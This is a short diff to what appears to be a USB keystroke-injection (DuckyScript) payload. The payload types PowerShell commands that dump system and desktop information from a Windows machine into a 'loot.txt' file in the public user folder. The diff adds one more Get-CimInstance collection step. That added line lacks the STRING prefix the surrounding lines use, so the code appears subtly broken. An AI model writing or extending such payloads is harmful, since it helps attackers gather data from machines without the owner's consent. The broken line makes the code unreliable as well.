@@ -26,6 +26,10 @@ STRING Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Publi
 DELAY 2000
 ENTER
 DELAY 2000
+Get-CimInstance -ClassName Win32_Desktop | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 2000
+ENTER
+DELAY 2000
 STRING systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 2000
 ENTER
